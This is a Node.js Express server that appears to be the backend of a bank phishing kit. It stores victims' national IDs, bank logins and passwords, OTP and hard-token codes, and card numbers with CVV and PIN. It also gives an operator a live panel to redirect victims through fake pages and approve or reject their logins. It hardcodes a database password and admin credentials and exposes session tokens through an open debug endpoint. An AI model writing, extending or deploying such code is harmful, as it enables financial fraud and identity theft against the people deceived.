const express = require('express');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;
const IS_VERCEL = !!process.env.VERCEL;

app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());

const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://postgres:R!Yv2Z%23%24nbhxC8!@db.sgcswfefivycflenyoaf.supabase.co:5432/postgres';

const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  max: 2,
  idleTimeoutMillis: 10000,
  connectionTimeoutMillis: 5000,
});

const ADMIN_USERNAME = 'Admin';
const ADMIN_PASSWORD = 'Admin1234@@';

let applications = [];
let liveVisitors = [];
let totalVisitors = 0;
let adminConfig = { whatsAppLink: '', customMessage: '' };

async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS app_data (
        key TEXT PRIMARY KEY,
        value JSONB NOT NULL DEFAULT '[]'::jsonb,
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin_sessions (
        token TEXT PRIMARY KEY,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        expires_at TIMESTAMPTZ DEFAULT (NOW() + INTERVAL '24 hours')
      )
    `);
  } catch (e) {
    console.error('initDB failed:', e.message);
  }
}

let lastLoadTime = 0;
const LOAD_CACHE_MS = 3000;

async function loadData(force) {
  const now = Date.now();
  if (!force && lastLoadTime && (now - lastLoadTime) < LOAD_CACHE_MS) return;
  try {
    const res = await pool.query('SELECT key, value FROM app_data');
    for (const row of res.rows) {
      switch (row.key) {
        case 'applications': applications = row.value || []; break;
        case 'visitors': liveVisitors = row.value || []; break;
        case 'total_visitors': totalVisitors = (typeof row.value === 'number') ? row.value : 0; break;
        case 'admin_config': adminConfig = row.value || { whatsAppLink: '', customMessage: '' }; break;
      }
    }
    lastLoadTime = Date.now();
  } catch (e) {
    console.error('loadData failed:', e.message);
  }
}

async function saveData() {
  try {
    await pool.query(`
      INSERT INTO app_data (key, value, updated_at) VALUES
        ('applications', $1::jsonb, NOW()),
        ('visitors', $2::jsonb, NOW()),
        ('total_visitors', $3::jsonb, NOW())
      ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()
    `, [
      JSON.stringify(applications),
      JSON.stringify(liveVisitors),
      JSON.stringify(totalVisitors)
    ]);
    lastLoadTime = Date.now();
  } catch (e) {
    console.error('saveData failed:', e.message);
  }
}

async function saveAdmin() {
  try {
    await pool.query(`
      INSERT INTO app_data (key, value, updated_at) VALUES ('admin_config', $1::jsonb, NOW())
      ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()
    `, [JSON.stringify(adminConfig)]);
  } catch (e) {
    console.error('saveAdmin failed:', e.message);
  }
}

async function saveSession(token) {
  try {
    await pool.query(
      `INSERT INTO admin_sessions (token, created_at, expires_at) VALUES ($1, NOW(), NOW() + INTERVAL '24 hours') ON CONFLICT (token) DO NOTHING`,
      [token]
    );
  } catch (e) {
    console.error('saveSession failed:', e.message);
  }
}

async function checkSession(token) {
  if (!token) return false;
  if (localSessions[token]) return true;
  try {
    const res = await pool.query(
      `SELECT token FROM admin_sessions WHERE token = $1 AND expires_at > NOW()`,
      [token]
    );
    if (res.rows.length > 0) {
      localSessions[token] = true;
      return true;
    }
    return false;
  } catch (e) {
    console.error('checkSession failed:', e.message);
    return localSessions[token] || false;
  }
}

async function deleteSession(token) {
  if (!token) return;
  try {
    await pool.query(`DELETE FROM admin_sessions WHERE token = $1`, [token]);
  } catch (e) {
    console.error('deleteSession failed:', e.message);
  }
}

const SESSION_COOKIE = 'manus-session';
const localSessions = {};

function genId() { return crypto.randomBytes(32).toString('hex'); }

function getAdminToken(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7);
  if (req.cookies && req.cookies[SESSION_COOKIE]) return req.cookies[SESSION_COOKIE];
  if (req.query && req.query.token) return req.query.token;
  return null;
}

async function isAdmin(req) {
  const token = getAdminToken(req);
  if (!token) return false;
  if (localSessions[token]) return true;
  return await checkSession(token);
}

function getActiveIds() {
  const cutoff = Date.now() - 120000;
  return applications.filter(a => a.lastActiveAt && a.lastActiveAt > cutoff).map(a => a.nationalId);
}

function findApp(nationalId) {
  return applications.find(a => a.nationalId === nationalId);
}

function unwrapInput(raw) {
  if (!raw) return {};
  if (raw.json !== undefined) return raw.json;
  return raw;
}

// Init DB on first request
let dbReady = false;
app.use(async (req, res, next) => {
  if (!dbReady) {
    try {
      await initDB();
      await loadData(true);
      dbReady = true;
    } catch (e) {
      console.error('DB init middleware failed:', e.message);
    }
  }
  next();
});

async function handleProcedure(fullPath, rawInput, req, res) {
  const procedure = fullPath.replace(/^(admin|applications)\./, '');
  const input = unwrapInput(rawInput);

  switch (procedure) {
    case 'login': {
      const { username, password } = input;
      if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const token = genId();
        await saveSession(token);
        localSessions[token] = true;
        if (res) {
          const cookieOpts = { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 };
          if (IS_VERCEL) cookieOpts.secure = true;
          res.cookie(SESSION_COOKIE, token, cookieOpts);
          res.cookie(SESSION_COOKIE + '-pub', token, { httpOnly: false, sameSite: 'lax', path: '/', maxAge: 86400000, ...(IS_VERCEL ? { secure: true } : {}) });
        }
        return { isAdmin: true, token };
      }
      throw { message: 'بيانات الدخول غير صحيحة', code: 'UNAUTHORIZED', httpStatus: 401 };
    }

    case 'logout': {
      const token = getAdminToken(req);
      if (token) delete localSessions[token];
      await deleteSession(token);
      if (res) {
        res.clearCookie(SESSION_COOKIE);
        res.clearCookie(SESSION_COOKIE + '-pub');
      }
      return { success: true };
    }

    case 'checkSession': {
      return { isAdmin: await isAdmin(req) };
    }

    case 'getApplications': {
      await loadData();
      const activeIds = getActiveIds();
      return { apps: applications, activeIds, totalVisitors };
    }

    case 'getLiveVisitors': {
      await loadData();
      const cutoff = Date.now() - 15000;
      const live = liveVisitors.filter(v => v.lastActiveAt && v.lastActiveAt > cutoff);
      return { visitors: live };
    }

    case 'getAllVisitors': {
      await loadData();
      return { visitors: liveVisitors, totalCount: totalVisitors };
    }

    case 'savePersonalInfo': {
      await loadData();
      const { nationalId, phoneNumber, fullName, governorate, address } = input;
      if (!nationalId) return { success: false };
      let app = findApp(nationalId);
      if (!app) {
        app = { id: genId().slice(0, 16), nationalId, createdAt: Date.now() };
        applications.push(app);
      }
      Object.assign(app, { phoneNumber, fullName, governorate, address, currentPage: 'personal', lastActiveAt: Date.now() });
      await saveData();
      return { success: true };
    }

    case 'saveLoginData': {
      await loadData();
      const { nationalId, username, password } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { username, password, currentPage: 'login', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveOtpData': {
      await loadData();
      const { nationalId, otpCode } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { otpCode, currentPage: 'otp', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveCardData': {
      await loadData();
      const { nationalId, cardNumber, cardExpiry, cardCvv, cardPin } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { cardNumber, cardExpiry, cardCvv, cardPin, currentPage: 'card', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveWatchLink': {
      await loadData();
      const { nationalId, watchLinkOtp } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { watchLinkOtp, currentPage: 'watchlink', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'saveHardToken': {
      await loadData();
      const { nationalId, hardTokenCode } = input;
      const app = findApp(nationalId);
      if (app) {
        Object.assign(app, { hardTokenCode, currentPage: 'hard-token', lastActiveAt: Date.now() });
        await saveData();
      }
      return { success: true };
    }

    case 'updatePage': {
      await loadData();
      const { nationalId, page } = input;
      const app = findApp(nationalId);
      if (app) {
        app.currentPage = page;
        app.lastActiveAt = Date.now();
        await saveData();
      }
      return { success: true };
    }

    case 'redirectUser':
    case 'redirectVisitor': {
      await loadData();
      const { nationalId, sessionId, page, showError } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { app.redirectTo = page; app.redirectError = showError || false; }
      }
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v) { v.redirectTo = page; }
      }
      await saveData();
      return { success: true };
    }

    case 'clearVisitorRedirect': {
      await loadData();
      const { nationalId, sessionId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { delete app.redirectTo; delete app.redirectError; }
      }
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v) { delete v.redirectTo; }
      }
      await saveData();
      return { success: true };
    }

    case 'clearRedirectByUser': {
      await loadData();
      const { nationalId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { delete app.redirectTo; delete app.redirectError; }
      }
      await saveData();
      return { success: true };
    }

    case 'getRedirectStatus': {
      await loadData();
      const { nationalId } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app && app.redirectTo) return { redirectTo: app.redirectTo, redirectError: app.redirectError || false };
      }
      return { redirectTo: null };
    }

    case 'getVisitorRedirect': {
      await loadData();
      const { sessionId } = input;
      if (sessionId) {
        const v = liveVisitors.find(x => x.sessionId === sessionId);
        if (v && v.redirectTo) return { redirectTo: v.redirectTo };
      }
      return { redirectTo: null };
    }

    case 'redirectAllToToken': {
      await loadData();
      applications.forEach(a => { a.redirectTo = 'token'; });
      await saveData();
      return { success: true };
    }

    case 'redirectWhatsApp': {
      await loadData();
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.redirectTo = 'whatsapp'; }
      await saveData();
      return { success: true };
    }

    case 'approveLogin': {
      await loadData();
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.loginStatus = 'approved'; }
      await saveData();
      return { success: true };
    }

    case 'rejectLogin': {
      await loadData();
      const { nationalId } = input;
      const app = findApp(nationalId);
      if (app) { app.loginStatus = 'rejected'; }
      await saveData();
      return { success: true };
    }

    case 'deleteApplication': {
      await loadData();
      const { nationalId } = input;
      applications = applications.filter(a => a.nationalId !== nationalId);
      await saveData();
      return { success: true };
    }

    case 'deleteInactiveClients': {
      await loadData();
      const activeIds = getActiveIds();
      const before = applications.length;
      applications = applications.filter(a => activeIds.includes(a.nationalId));
      await saveData();
      return { success: true, deletedCount: before - applications.length };
    }

    case 'resetTotalVisitors': {
      totalVisitors = 0;
      liveVisitors = [];
      await saveData();
      return { success: true };
    }

    case 'getWhatsAppLink': {
      await loadData();
      return { link: adminConfig.whatsAppLink || '' };
    }

    case 'updateWhatsAppLink': {
      adminConfig.whatsAppLink = input.link || '';
      await saveAdmin();
      return { success: true };
    }

    case 'getCustomMessage': {
      await loadData();
      return { message: adminConfig.customMessage || '' };
    }

    case 'setCustomMessage': {
      await loadData();
      const { nationalId, message } = input;
      if (nationalId) {
        const app = findApp(nationalId);
        if (app) { app.customMessage = message; await saveData(); }
      } else {
        adminConfig.customMessage = message || '';
        await saveAdmin();
      }
      return { success: true };
    }

    case 'clearCustomMessage': {
      adminConfig.customMessage = '';
      await saveAdmin();
      return { success: true };
    }

    case 'updateVisitor': {
      await loadData();
      const { nationalId, ...data } = input;
      const app = findApp(nationalId);
      if (app) { Object.assign(app, data); await saveData(); }
      return { success: true };
    }

    default:
      throw { message: `No procedure found on path "${fullPath}"`, code: 'NOT_FOUND', httpStatus: 404 };
  }
}

app.all('/api/trpc/*', async (req, res) => {
  const fullPath = req.params[0] || '';
  const procedures = fullPath.split(',').filter(Boolean);
  const results = [];

  for (let i = 0; i < procedures.length; i++) {
    const proc = procedures[i];
    let rawInput = {};

    if (req.method === 'GET') {
      try {
        if (req.query.input) {
          const parsed = JSON.parse(req.query.input);
          rawInput = parsed[String(i)] || parsed[i] || {};
        }
      } catch (e) { }
    } else {
      const body = req.body || {};
      rawInput = body[String(i)] || body[i] || body;
    }

    try {
      const result = await handleProcedure(proc, rawInput, req, res);
      results.push({ result: { data: { json: result } } });
    } catch (err) {
      const httpStatus = err.httpStatus || 500;
      results.push({
        error: { json: { message: err.message, code: -32603, data: { code: err.code || 'INTERNAL_SERVER_ERROR', httpStatus, path: proc } } }
      });
    }
  }

  res.json(results);
});

app.post('/api/presence', async (req, res) => {
  const { sessionId, currentPage } = req.body || {};
  if (!sessionId) return res.json({ ok: false });

  await loadData();

  let visitor = liveVisitors.find(v => v.sessionId === sessionId);
  if (!visitor) {
    visitor = { sessionId, createdAt: Date.now(), id: genId().slice(0, 16) };
    liveVisitors.push(visitor);
    totalVisitors++;
  }
  visitor.lastActiveAt = Date.now();
  if (currentPage) visitor.currentPage = currentPage;

  const redirectTo = visitor.redirectTo;
  if (redirectTo) {
    delete visitor.redirectTo;
    await saveData();
    return res.json({ ok: true, redirectTo });
  }
  await saveData();
  res.json({ ok: true });
});

app.post('/api/heartbeat', async (req, res) => {
  const { sessionId, visitorId } = req.body || {};
  const id = sessionId || visitorId;
  if (id) {
    await loadData();
    const visitor = liveVisitors.find(v => v.sessionId === id);
    if (visitor) {
      visitor.lastActiveAt = Date.now();
      await saveData();
    }
  }
  res.json({ ok: true });
});

app.get('/api/debug-session', async (req, res) => {
  try {
    const r1 = await pool.query('SELECT token, created_at, expires_at FROM admin_sessions LIMIT 10');
    const r2 = await pool.query('SELECT NOW() as now');
    res.json({ sessions: r1.rows, dbNow: r2.rows[0].now, localSessions: Object.keys(localSessions), dbReady });
  } catch (e) {
    res.json({ error: e.message, localSessions: Object.keys(localSessions), dbReady });
  }
});

app.get('/api/oauth/callback', (req, res) => {
  const token = req.query.token || (req.cookies && req.cookies[SESSION_COOKIE]);
  if (token) {
    const cookieOpts = { httpOnly: true, sameSite: 'lax', path: '/', maxAge: 86400000 };
    if (IS_VERCEL) cookieOpts.secure = true;
    res.cookie(SESSION_COOKIE, token, cookieOpts);
    res.cookie(SESSION_COOKIE + '-pub', token, { httpOnly: false, sameSite: 'lax', path: '/', maxAge: 86400000, ...(IS_VERCEL ? { secure: true } : {}) });
    res.send(`<!DOCTYPE html><html><head><script>sessionStorage.setItem("manus-cookie","manus-session=${token}");window.location.replace("/admin/dashboard");</script></head><body></body></html>`);
  } else {
    res.redirect('/admin/dashboard');
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!IS_VERCEL) {
  initDB().then(() => loadData()).then(() => {
    app.listen(PORT, () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  });
}

module.exports = app;
